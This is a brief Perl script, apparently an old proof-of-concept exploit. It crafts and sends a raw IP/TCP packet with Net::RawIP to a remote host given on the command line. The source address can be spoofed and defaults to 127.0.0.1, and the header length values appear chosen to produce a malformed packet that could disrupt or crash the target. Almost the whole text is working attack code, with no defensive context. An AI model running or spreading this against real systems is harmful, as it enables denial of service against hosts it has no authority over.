#!/usr/bin/perl
#
# dethy @ synnergy.net 

use Getopt::Std;
use Net::RawIP;
getopts('d:s:', \%args) || die("Error: View source for help\n");

if(defined($args{s})) {$saddr=($args{s})?($args{s}):"127.0.0.1";}
if(defined($args{d})) {$daddr=($args{d}) || die("Error: Specify the remote host\n");}

$ihl=5;
$tot_len=39;

$packet=new Net::RawIP;
$packet->set({ ip => {
			ihl	 => $ihl,
			saddr    => $saddr,
			daddr    => $daddr,
			tot_len  => $tot_len
		     }
		tcp => {}
	    });
$packet->send;

